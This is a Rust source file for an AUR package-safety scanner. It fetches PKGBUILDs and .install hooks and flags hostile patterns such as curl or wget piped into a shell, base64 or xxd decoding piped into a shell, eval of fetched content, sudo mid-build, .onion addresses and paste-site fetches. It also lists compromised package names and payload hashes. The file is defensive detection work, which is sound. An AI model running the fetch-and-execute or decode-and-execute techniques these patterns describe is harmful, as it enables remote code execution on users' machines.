//! AUR PKGBUILD safety scanner (pre-install tripwire; hit → ask before continue).
//!
//! Heuristics + 2026 campaigns: Atomic Arch (npm/bun infostealer),
//! openconnect-sso (`sudo` + validator, Tor stage2), early-August
//! (ELF as generic build tool). See sudo_escalation_line, onion_address_line,
//! decoy_tool_binary_line, KNOWN_COMPROMISED_AUR_PACKAGES, KNOWN_MALICIOUS_SHA256.

use colored::Colorize;
use std::io::{self, Write};

use crate::*;

/// Raw file from AUR cgit. None = nothing to check (not "clean").
pub(crate) fn fetch_aur_file(pkg: &str, filename: &str) -> Option<String> {
    let url = format!(
        "https://aur.archlinux.org/cgit/aur.git/plain/{}?h={}",
        filename, pkg
    );
    let text = crate::http::get(&url, 10)?;
    if text.trim().is_empty() {
        None
    } else {
        Some(text)
    }
}

pub(crate) fn fetch_aur_pkgbuild(pkg: &str) -> Option<String> {
    fetch_aur_file(pkg, "PKGBUILD")
}

/// `install=` hook name (runs as root; Atomic Arch 2026 used this).
pub(crate) fn parse_install_filename(pkgbuild_text: &str) -> Option<String> {
    for line in pkgbuild_text.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        if let Some(rest) = l.strip_prefix("install=") {
            let value = strip_trailing_comment(rest);
            let name = value.trim().trim_matches('\'').trim_matches('"');
            if !name.is_empty() {
                return Some(name.to_string());
            }
        }
    }
    None
}

/// Like parse_install_filename, also expands $pkgname/$pkgbase. None if unresolved.
pub(crate) fn resolve_install_filename(pkgbuild_text: &str) -> Option<String> {
    let raw = parse_install_filename(pkgbuild_text)?;
    if !raw.contains('$') {
        return Some(raw);
    }
    let pkgname = simple_var(pkgbuild_text, "pkgname");
    let pkgbase = simple_var(pkgbuild_text, "pkgbase");
    let resolved = raw
        .replace("${pkgname}", pkgname.as_deref().unwrap_or("\u{0}"))
        .replace("$pkgname", pkgname.as_deref().unwrap_or("\u{0}"))
        .replace("${pkgbase}", pkgbase.as_deref().unwrap_or("\u{0}"))
        .replace("$pkgbase", pkgbase.as_deref().unwrap_or("\u{0}"));
    if resolved.contains('$') || resolved.contains('\u{0}') {
        None
    } else {
        Some(resolved)
    }
}

/// Strip trailing `# comment` (bash word-boundary rule; keep `#` inside quotes).
/// Prevents install=... # note from breaking .install discovery.
fn strip_trailing_comment(rest: &str) -> &str {
    let trimmed = rest.trim_start();
    let lead_ws = rest.len() - trimmed.len();
    let bytes = trimmed.as_bytes();
    if let Some(&first) = bytes.first() {
        if first == b'\'' || first == b'"' {
            if let Some(close_rel) = trimmed[1..].find(first as char) {
                return &rest[..lead_ws + close_rel + 2];
            }
            return rest; // unterminated quote - nothing sane to cut, leave as-is
        }
    }
    let mut prev_was_space = true; // start of the (already-trimmed) value counts as a boundary
    for (i, c) in trimmed.char_indices() {
        if c == '#' && prev_was_space {
            return &rest[..lead_ws + i];
        }
        prev_was_space = c.is_whitespace();
    }
    rest
}

/// First scalar key=value (None for arrays like pkgname=(a b)).
fn simple_var(source: &str, key: &str) -> Option<String> {
    let needle = format!("{}=", key);
    for line in source.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        if let Some(rest) = l.strip_prefix(&needle) {
            if rest.trim_start().starts_with('(') {
                return None;
            }
            let value = strip_trailing_comment(rest);
            let v = value.trim().trim_matches('\'').trim_matches('"');
            if !v.is_empty() {
                return Some(v.to_string());
            }
        }
    }
    None
}

/// curl/wget eventually piped into sh/bash/zsh/source (loose on flags/whitespace).
pub(crate) fn curl_pipe_shell_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let has_fetcher = lower.contains("curl ") || lower.contains("curl\t")
        || lower.contains("wget ") || lower.contains("wget\t");
    if !has_fetcher || !lower.contains('|') {
        return false;
    }
    let after_pipe = lower.splitn(2, '|').nth(1).unwrap_or("").trim();
    let mut tokens = after_pipe.split_whitespace();
    let mut first = tokens.next().unwrap_or("");
    // `env sh` / `env -S bash` wrapper - skip past `env` and its flags to
    // the actual interpreter token.
    if first == "env" {
        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
    }
    // Basename so /bin/sh and ./sh match bare shell names.
    let basename = first.rsplit('/').next().unwrap_or(first);
    ["sh", "bash", "zsh", "source", "."].contains(&basename)
}

#[cfg(test)]
pub(crate) fn is_curl_pipe_shell(source: &str) -> bool {
    source.lines().any(curl_pipe_shell_line)
}

/// First matching line number (1-indexed), if any.
pub(crate) fn line_of_curl_pipe_shell(source: &str) -> Option<usize> {
    source.lines().position(curl_pipe_shell_line).map(|i| i + 1)
}

/// base64 -d/--decode (rare in legit PKGBUILDs; often obfuscation).
pub(crate) fn base64_decode_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("base64 -d") || lower.contains("base64 --decode")
        || lower.contains("base64 -D")
}

#[cfg(test)]
pub(crate) fn is_base64_decode(source: &str) -> bool {
    source.lines().any(base64_decode_line)
}

pub(crate) fn line_of_base64_decode(source: &str) -> Option<usize> {
    source.lines().position(base64_decode_line).map(|i| i + 1)
}

/// Last `|` stage is a shell? (decoders often sit mid-pipeline).
fn pipes_into_shell(lower_line: &str) -> bool {
    let after_pipe = lower_line.rsplitn(2, '|').next().unwrap_or("").trim();
    let mut tokens = after_pipe.split_whitespace();
    let mut first = tokens.next().unwrap_or("");
    if first == "env" {
        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
    }
    let basename = first.rsplit('/').next().unwrap_or(first);
    ["sh", "bash", "zsh", "source", "."].contains(&basename)
}

/// base64 -d | sh (decoded payload runs immediately).
pub(crate) fn base64_pipe_shell_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let has_decode = lower.contains("base64 -d") || lower.contains("base64 --decode");
    if !has_decode || !lower.contains('|') {
        return false;
    }
    pipes_into_shell(&lower)
}

#[cfg(test)]
pub(crate) fn is_base64_pipe_shell(source: &str) -> bool {
    source.lines().any(base64_pipe_shell_line)
}

pub(crate) fn line_of_base64_pipe_shell(source: &str) -> Option<usize> {
    source.lines().position(base64_pipe_shell_line).map(|i| i + 1)
}

/// xxd -r -p | shell (hex-encoded payload; flag order flexible).
pub(crate) fn xxd_pipe_shell_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    if !lower.contains("xxd") || !lower.contains('|') {
        return false;
    }
    let has_reverse = lower.contains(" -r") || lower.contains("-rp") || lower.contains("-pr");
    let has_plain = lower.contains(" -p") || lower.contains("-rp") || lower.contains("-pr");
    if !(has_reverse && has_plain) {
        return false;
    }
    pipes_into_shell(&lower)
}

#[cfg(test)]
pub(crate) fn is_xxd_pipe_shell(source: &str) -> bool {
    source.lines().any(xxd_pipe_shell_line)
}

pub(crate) fn line_of_xxd_pipe_shell(source: &str) -> Option<usize> {
    source.lines().position(xxd_pipe_shell_line).map(|i| i + 1)
}

/// source/`.` of <(curl/wget ...) — process-subst remote exec.
pub(crate) fn source_process_subst_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    if !lower.contains("<(") || !(lower.contains("curl") || lower.contains("wget")) {
        return false;
    }
    lower.contains("source ") || lower.starts_with(". <(") || lower.starts_with(".<(")
}

#[cfg(test)]
pub(crate) fn is_source_process_subst(source: &str) -> bool {
    source.lines().any(source_process_subst_line)
}

pub(crate) fn line_of_source_process_subst(source: &str) -> Option<usize> {
    source.lines().position(source_process_subst_line).map(|i| i + 1)
}

/// chmod 777 / a+rwx (overly permissive for a build script).
pub(crate) fn chmod_777_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("chmod") && (lower.contains("777") || lower.contains("a+rwx"))
}

#[cfg(test)]
pub(crate) fn is_chmod_777(source: &str) -> bool {
    source.lines().any(chmod_777_line)
}

pub(crate) fn line_of_chmod_777(source: &str) -> Option<usize> {
    source.lines().position(chmod_777_line).map(|i| i + 1)
}

/// Bare IPv4 literal (legit builds use domains). FP: version "1.2.3.4" — review only.
pub(crate) fn line_has_raw_ipv4(source: &str) -> bool {
    let bytes = source.as_bytes();
    let is_boundary = |c: Option<u8>| !matches!(c, Some(b) if b.is_ascii_digit() || b == b'.');

    let chars: Vec<char> = source.chars().collect();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        if chars[i].is_ascii_digit() {
            let start = i;
            let mut j = i;
            let mut octets = 0;
            let mut ok = true;
            loop {
                let mut k = j;
                while k < n && chars[k].is_ascii_digit() && k - j < 3 {
                    k += 1;
                }
                if k == j {
                    ok = false;
                    break;
                }
                let octet: u32 = chars[j..k].iter().collect::<String>().parse().unwrap_or(999);
                if octet > 255 {
                    ok = false;
                    break;
                }
                octets += 1;
                j = k;
                if octets == 4 {
                    break;
                }
                if j < n && chars[j] == '.' {
                    j += 1;
                } else {
                    ok = false;
                    break;
                }
            }
            if ok && octets == 4 {
                let before_ok = is_boundary(bytes.get(start.wrapping_sub(1)).copied().filter(|_| start > 0));
                let after_ok = is_boundary(chars.get(j).map(|c| *c as u8));
                let before_ok = start == 0 || before_ok;
                if before_ok && after_ok {
                    return true;
                }
            }
            i = start + 1;
        } else {
            i += 1;
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn contains_raw_ipv4(source: &str) -> bool {
    source.lines().any(line_has_raw_ipv4)
}

pub(crate) fn line_of_raw_ipv4(source: &str) -> Option<usize> {
    source.lines().position(line_has_raw_ipv4).map(|i| i + 1)
}

/// Long run of \xHH escapes (shellcode-ish); not bare hex (checksums are fine).
pub(crate) fn hex_escape_payload_line(line: &str) -> bool {
    const THRESHOLD: usize = 8; // consecutive \xHH escapes in one line
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let bytes = l.as_bytes();
    let mut i = 0;
    let mut run = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 3 < bytes.len() && (bytes[i + 1] == b'x' || bytes[i + 1] == b'X')
            && bytes[i + 2].is_ascii_hexdigit() && bytes[i + 3].is_ascii_hexdigit()
        {
            run += 1;
            if run >= THRESHOLD {
                return true;
            }
            i += 4;
        } else {
            run = 0;
            i += 1;
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn is_hex_escape_payload(source: &str) -> bool {
    source.lines().any(hex_escape_payload_line)
}

pub(crate) fn line_of_hex_escape_payload(source: &str) -> Option<usize> {
    source.lines().position(hex_escape_payload_line).map(|i| i + 1)
}

/// Fetch from paste sites (2018 acroread/balz/minergate staging).
pub(crate) fn paste_site_fetch_line(line: &str) -> bool {
    const HOSTS: &[&str] = &[
        "pastebin.com/raw", "hastebin.com/raw", "hastebin.com/share",
        "dpaste.com", "dpaste.org", "ix.io", "0x0.st", "transfer.sh",
        "paste.ee", "termbin.com",
    ];
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    if !(lower.contains("curl") || lower.contains("wget")) {
        return false;
    }
    HOSTS.iter().any(|h| lower.contains(h))
}

#[cfg(test)]
pub(crate) fn is_paste_site_fetch(source: &str) -> bool {
    source.lines().any(paste_site_fetch_line)
}

pub(crate) fn line_of_paste_site_fetch(source: &str) -> Option<usize> {
    source.lines().position(paste_site_fetch_line).map(|i| i + 1)
}

/// `compromised.txt` marker (2018 acroread takeover IOC).
pub(crate) fn compromised_marker_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    l.contains("compromised.txt")
}

#[cfg(test)]
pub(crate) fn has_compromised_marker(source: &str) -> bool {
    source.lines().any(compromised_marker_line)
}

pub(crate) fn line_of_compromised_marker(source: &str) -> Option<usize> {
    source.lines().position(compromised_marker_line).map(|i| i + 1)
}

/// Exact package-name IOCs (rotates; high confidence). Atomic Arch 2026
/// npm/bun names; openconnect-sso mechanism → sudo_escalation_line.
const KNOWN_MALICIOUS_PACKAGE_NAMES: &[&str] = &["atomic-lockfile", "js-digest", "lockfile-js"];

/// openconnect-sso stage hashes; exact sha256sums=() match = known-bad.
const KNOWN_MALICIOUS_SHA256: &[&str] = &[
    "e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77",
    "2d25d2ea313767fae5808164224cf6ad610ab09546d1e5a6f033eedbfd98a281",
    "06c857c8ca798d50c765b4de39e6c4f272ecb57bc8316a8ed4c0fdf02fb59502",
];

#[cfg(test)]
pub(crate) fn contains_known_malicious_hash(source: &str) -> Option<&'static str> {
    KNOWN_MALICIOUS_SHA256.iter().copied().find(|h| source.contains(h))
}

/// First matching line + hash, if any.
pub(crate) fn line_of_known_malicious_hash(source: &str) -> Option<(usize, &'static str)> {
    for (i, line) in source.lines().enumerate() {
        if let Some(h) = KNOWN_MALICIOUS_SHA256.iter().copied().find(|h| line.contains(h)) {
            return Some((i + 1, h));
        }
    }
    None
}

#[cfg(test)]
pub(crate) fn contains_known_malicious_package(source: &str) -> Option<&'static str> {
    KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|name| source.contains(name))
}

/// First matching line + package name, if any.
pub(crate) fn line_of_known_malicious_package(source: &str) -> Option<(usize, &'static str)> {
    for (i, line) in source.lines().enumerate() {
        if let Some(name) = KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|n| line.contains(n)) {
            return Some((i + 1, name));
        }
    }
    None
}

/// Known-hijacked AUR pkgbases (early-Aug 2026 + openconnect-sso,
/// storageexplorer-bin). Target package name, not mid-build deps.
/// Absence ≠ clean — decoy_tool_binary_line is the generic backstop.
const KNOWN_COMPROMISED_AUR_PACKAGES: &[&str] = &[
    "openconnect-sso",
    "archutil",
    "bigwebapp-manager",
    "boringssl-git",
    "cinnamon-no-nemo",
    "duhh",
    "eden-nightly",
    "garlic-decompiler-gui",
    "gigolo-git",
    "gitarbor-bin",
    "icloudpd",
    "imago-bin",
    "juicebox-plus-git",
    "magic-context-dashboard-bin",
    "option-term",
    "pagerduty-short-circuiter",
    "portless",
    "pylnker-git",
    "python-libipld-git",
    "python-numkong",
    "python-parallax",
    "python-ultraplot-git",
    "ramses-git",
    "src-cli-bin",
    "steamidra-bin",
    "stirling-pdf-desktop-bin",
    "wiki-go",
    "windscribe-cli-v2-bin",
    "storageexplorer-bin",
];

/// Exact case-insensitive match vs KNOWN_COMPROMISED_AUR_PACKAGES (not substring).
pub(crate) fn is_known_compromised_package(pkg: &str) -> bool {
    KNOWN_COMPROMISED_AUR_PACKAGES.iter().any(|p| p.eq_ignore_ascii_case(pkg))
}

/// Finding if `name` is on KNOWN_COMPROMISED_AUR_PACKAGES (install + --scan).
fn known_compromised_package_finding(name: &str) -> Option<(String, Finding)> {
    is_known_compromised_package(name).then(|| {
        (
            "pkgbase".to_string(),
            Finding {
                line: 0,
                severity: Severity::ConfirmedIoc,
                message: format!(
                    "'{}' is itself on the publicly confirmed list of AUR packages hijacked in the early-August 2026 wave - installing it pulls whatever the current maintainer has pushed, confirmed-malicious history or not",
                    name
                ),
            },
        )
    })
}

/// Decoy build-tool names (early-Aug 2026 ELF disguise). Separate from package blocklist.
const DECOY_TOOL_BINARY_NAMES: &[&str] = &[
    "linter", "hasher", "minifier", "validator", "converter", "indexer",
    "encryptor", "checker", "tagger", "parser", "preprocessor", "generator",
    "assembler", "packer", "compressor", "serializer", "migrator",
    "optimizer", "merger",
];

/// install -Dm755/chmod +x of a DECOY_TOOL_BINARY_NAMES under bin/.
/// Suspicious only (legit tools share those names); early-Aug 2026 disguise.
pub(crate) fn decoy_tool_binary_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let installs_executable = lower.contains("install")
        && (lower.contains("-dm755") || lower.contains("-dm 755") || lower.contains("-m755") || lower.contains("-m 755"))
        || lower.contains("chmod +x")
        || lower.contains("chmod 755");
    if !installs_executable {
        return false;
    }
    DECOY_TOOL_BINARY_NAMES.iter().any(|name| {
        // Match the name as its own path segment/word, not as a substring
        // of something longer (e.g. "validators.conf" shouldn't hit).
        lower.split(|c: char| c == '/' || c.is_whitespace() || c == '"' || c == '\'')
            .any(|tok| tok == *name)
    })
}

#[cfg(test)]
pub(crate) fn has_decoy_tool_binary(source: &str) -> bool {
    source.lines().any(decoy_tool_binary_line)
}

pub(crate) fn line_of_decoy_tool_binary(source: &str) -> Option<usize> {
    source.lines().position(decoy_tool_binary_line).map(|i| i + 1)
}

/// npm/bun/pip install of a named external package (Atomic Arch pattern).
/// Bare `npm ci` is fine. FP: legit global CLI installs — review only.
pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
    const PATTERNS: &[&str] = &[
        "npm install ", "npm i ", "bun install ", "bun add ",
        "yarn add ", "pip install ", "pip3 install ", "gem install ",
    ];
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    for p in PATTERNS {
        if let Some(idx) = lower.find(p) {
            let rest = &l[idx + p.len()..];
            let first_pkg_tok = rest.split_whitespace().find(|t| !t.starts_with('-'));
            if let Some(tok) = first_pkg_tok {
                if !tok.starts_with('.') && !tok.starts_with('/') {
                    return true;
                }
            }
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn is_foreign_pkg_manager_install(source: &str) -> bool {
    source.lines().any(foreign_pkg_manager_install_line)
}

pub(crate) fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize> {
    source.lines().position(foreign_pkg_manager_install_line).map(|i| i + 1)
}

/// sudo/pkexec/doas inside PKGBUILD/.install (makepkg is unprivileged).
/// openconnect-sso 2026 ran `validator` via sudo during packaging.
pub(crate) fn sudo_escalation_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    ["sudo ", "sudo\t", "pkexec ", "doas "].iter().any(|p| lower.contains(p))
}

#[cfg(test)]
pub(crate) fn is_sudo_escalation(source: &str) -> bool {
    source.lines().any(sudo_escalation_line)
}

pub(crate) fn line_of_sudo_escalation(source: &str) -> Option<usize> {
    source.lines().position(sudo_escalation_line).map(|i| i + 1)
}

/// Hardcoded .onion address (Atomic Arch / openconnect-sso stage2 used Tor).
pub(crate) fn onion_address_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    l.to_lowercase().contains(".onion")
}

#[cfg(test)]
pub(crate) fn is_onion_address(source: &str) -> bool {
    source.lines().any(onion_address_line)
}

pub(crate) fn line_of_onion_address(source: &str) -> Option<usize> {
    source.lines().position(onion_address_line).map(|i| i + 1)
}

/// eval "$(curl/wget ...)" / backticks — remote code without a pipe.
/// Bare eval of local vars is fine and not flagged.
pub(crate) fn eval_remote_exec_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let Some(idx) = lower.find("eval") else { return false };
    let after = &lower[idx..];
    let has_subshell = after.contains("$(") || after.contains('`');
    has_subshell && (after.contains("curl") || after.contains("wget"))
}

#[cfg(test)]
pub(crate) fn is_eval_remote_exec(source: &str) -> bool {
    source.lines().any(eval_remote_exec_line)
}

pub(crate) fn line_of_eval_remote_exec(source: &str) -> Option<usize> {
    source.lines().position(eval_remote_exec_line).map(|i| i + 1)
}

/// python -c with exec/eval/os.system/subprocess/os.popen (shell-heuristic dodge).
pub(crate) fn python_inline_exec_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let has_python_c = (lower.contains("python ") || lower.contains("python3 ") || lower.contains("python2 "))
        && lower.contains(" -c");
    if !has_python_c {
        return false;
    }
    ["exec(", "eval(", "os.system(", "subprocess.", "os.popen("]
        .iter()
        .any(|p| lower.contains(p))
}

#[cfg(test)]
pub(crate) fn is_python_inline_exec(source: &str) -> bool {
    source.lines().any(python_inline_exec_line)
}

pub(crate) fn line_of_python_inline_exec(source: &str) -> Option<usize> {
    source.lines().position(python_inline_exec_line).map(|i| i + 1)
}

/// openssl decrypt at build time (obfuscated payload; needs baked-in key).
pub(crate) fn openssl_decrypt_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("openssl")
        && lower.contains(" -d")
        && (lower.contains("enc") || lower.contains("aes") || lower.contains("des") || lower.contains("cipher"))
}

#[cfg(test)]
pub(crate) fn is_openssl_decrypt(source: &str) -> bool {
    source.lines().any(openssl_decrypt_line)
}

pub(crate) fn line_of_openssl_decrypt(source: &str) -> Option<usize> {
    source.lines().position(openssl_decrypt_line).map(|i| i + 1)
}

/// Line fallback for top_level_command_substitution if AST fails.
/// Brace-depth proxy for "outside function body"; function-open lines skipped.
pub(crate) fn top_level_command_substitution_line(source: &str) -> Option<usize> {
    let mut depth: i32 = 0;
    for (i, line) in source.lines().enumerate() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        let opens_function = l.ends_with('{') && l.contains("()");
        if depth == 0 && !opens_function && (line.contains('`') || line.contains("$(")) {
            return Some(i + 1);
        }
        depth += line.matches('{').count() as i32 - line.matches('}').count() as i32;
    }
    None
}

/// Suspicious = heuristic (possible FP). ConfirmedIoc = exact campaign match (low FP).
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum Severity {
    Suspicious,
    ConfirmedIoc,
}

#[derive(Clone, Debug)]
pub(crate) struct Finding {
    /// 1-indexed line number the pattern matched on; 0 if not line-specific.
    line: usize,
    message: String,
    severity: Severity,
}

/// Run all heuristics on PKGBUILD or .install; empty = clean.
pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    if let Some(line) = crate::bash_ast::curl_pipe_shell(source).or_else(|| line_of_curl_pipe_shell(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "downloads and pipes a remote script straight into a shell (curl/wget | sh)".to_string(),
        });
    }
    if let Some(line) = line_of_base64_decode(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "decodes a base64 blob (possible obfuscated payload)".to_string(),
        });
    }
    if let Some(line) = line_of_chmod_777(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "sets world-writable/executable permissions (chmod 777)".to_string(),
        });
    }
    if let Some(line) = line_of_raw_ipv4(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "fetches from or references a hardcoded raw IP address instead of a domain".to_string(),
        });
    }
    if let Some(line) = line_of_hex_escape_payload(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "contains a long run of \\xHH hex-escape sequences (possible encoded/obfuscated payload)".to_string(),
        });
    }
    if let Some(line) = line_of_paste_site_fetch(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "fetches from a paste-dump site (pastebin/hastebin/dpaste/ix.io/...) - the delivery mechanism used by the 2018 acroread/balz/minergate AUR takeover".to_string(),
        });
    }
    if let Some(line) = line_of_compromised_marker(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: "references 'compromised.txt' - the exact marker file dropped by the 2018 acroread/balz/minergate AUR takeover".to_string(),
        });
    }
    if let Some((line, name)) = line_of_known_malicious_package(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: format!(
                "references '{}' - a known-malicious package name from a documented AUR supply-chain campaign (Atomic Arch, June 2026)",
                name
            ),
        });
    }
    if let Some((line, hash)) = line_of_known_malicious_hash(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: format!(
                "sha256 '{}' matches a published payload hash from the openconnect-sso-anchored AUR wave (Jul/Aug 2026)",
                hash
            ),
        });
    }
    if let Some(line) = line_of_foreign_pkg_manager_install(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "installs a named external package via npm/bun/yarn/pip/gem mid-build - the mechanism the Atomic Arch AUR campaign used to smuggle in its payload".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::sudo_escalation(source).or_else(|| line_of_sudo_escalation(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "invokes sudo/pkexec/doas from inside the build script - makepkg builds unprivileged on purpose, so this escalates privilege mid-build; the exact mechanism reported in the openconnect-sso-anchored AUR wave (Jul/Aug 2026)".to_string(),
        });
    }
    if let Some(line) = line_of_onion_address(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "references a .onion address - legitimate PKGBUILDs don't hardcode Tor hidden-service addresses; matches the Tor-backed second-stage delivery reused across the June 2026 and Jul/Aug 2026 AUR campaigns".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::eval_remote_exec(source).or_else(|| line_of_eval_remote_exec(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "runs `eval` on a curl/wget command substitution - executes fetched remote content without a literal pipe-into-shell to grep for".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::python_inline_exec(source).or_else(|| line_of_python_inline_exec(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "python -c snippet execs/evals content inline - a python-flavored obfuscated-execution pattern".to_string(),
        });
    }
    if let Some(line) = line_of_openssl_decrypt(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "decrypts a bundled blob with openssl (possible obfuscated payload, same role as base64 -d)".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::decode_pipe_shell(source)
        .or_else(|| line_of_base64_pipe_shell(source))
        .or_else(|| line_of_xxd_pipe_shell(source))
    {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "decodes a base64/hex-encoded blob and pipes it straight into a shell (base64 -d | sh / xxd -r -p | bash) - same obfuscated-execution role as curl|sh, just an inline-stashed payload instead of a network fetch".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::source_process_subst_remote(source).or_else(|| line_of_source_process_subst(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "sources a curl/wget process substitution (source <(curl ...)) - runs fetched remote content with neither a literal pipe nor a command substitution for the other checks to key on".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::top_level_command_substitution(source).or_else(|| top_level_command_substitution_line(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "command substitution ($(...) or `...`) outside any function - this runs the instant ANYTHING sources the PKGBUILD (makepkg --printsrcinfo, an AUR helper's metadata read, ...), not just during build(); often just a stray markdown-code-span backtick pasted into a field like pkgdesc, but treated the same either way since the effect is identical".to_string(),
        });
    }
    if let Some(line) = line_of_decoy_tool_binary(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "installs an executable under a generic build-tool name (linter/hasher/minifier/validator/...) - the payload-disguise technique used across the early-August 2026 AUR wave (see KNOWN_COMPROMISED_AUR_PACKAGES)".to_string(),
        });
    }
    findings
}

/// Pre-install AUR scan: any finding needs explicit "y". Fetch fail ≠ hit.
/// Returns successful fetches for verify_local_clone_or_rescan.
pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::HashMap<String, FetchedSource> {
    let mut any_findings = false;
    let mut fetched: std::collections::HashMap<String, FetchedSource> = std::collections::HashMap::new();
    println!("{} Scanning AUR PKGBUILDs and .install hooks for suspicious patterns...", ">>>".green().bold());

    for pkg in pkgs {
        let pkgbuild_src = match fetch_aur_pkgbuild(pkg) {
            Some(s) => s,
            None => continue,
        };

        let install = resolve_install_filename(&pkgbuild_src)
            .and_then(|name| fetch_aur_file(pkg, &name).map(|src| (name, src)));

        // (file label, Finding) pairs across both PKGBUILD and, if present,
        // the referenced .install hook.
        let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(&pkgbuild_src)
            .into_iter()
            .map(|f| ("PKGBUILD".to_string(), f))
            .collect();

        // Name-based check against publicly confirmed hijacked pkgbases -
        // independent of PKGBUILD content, so it still fires even on a
        // build script that (for now) reads completely clean.
        if let Some(finding) = known_compromised_package_finding(pkg) {
            pkg_findings.push(finding);
        }

        if let Some((install_name, install_src)) = &install {
            pkg_findings.extend(
                scan_pkgbuild_source(install_src)
                    .into_iter()
                    .map(|f| (install_name.clone(), f)),
            );
        }

        fetched.insert(pkg.clone(), FetchedSource { pkgbuild: pkgbuild_src, install });

        if pkg_findings.is_empty() {
            continue;
        }
        any_findings = true;

        let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
            .collect();
        let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::Suspicious)
            .collect();

        // Highest-confidence alert first: a confirmed IOC match against a
        // disclosed campaign is more actionable than a generic heuristic.
        // The specific campaign is named in each finding's own message.
        if !atomic.is_empty() {
            print_finding_block(pkg, "Alert, matched a known-malicious IOC", &atomic, true, SourceOrigin::Cgit);
        }
        if !suspicious.is_empty() {
            print_finding_block(pkg, "Warning, detected suspicious fragment", &suspicious, false, SourceOrigin::Cgit);
        }
    }

    if !any_findings {
        return fetched;
    }

    eprintln!();
    eprintln!(
        "{} One or more AUR packages have PKGBUILD/.install content matching \
        known-suspicious patterns. Review them yourself before proceeding:",
        ">>>".red().bold()
    );
    for pkg in pkgs {
        eprintln!("    https://aur.archlinux.org/cgit/aur.git/tree/PKGBUILD?h={}", pkg);
    }
    eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
    io::stderr().flush().ok();

    let answer = read_line_raw();
    let confirmed = answer.trim().eq_ignore_ascii_case("y");

    if !confirmed {
        eprintln!("{} Aborted.", ">>>".red().bold());
        std::process::exit(1);
    }

    fetched
}

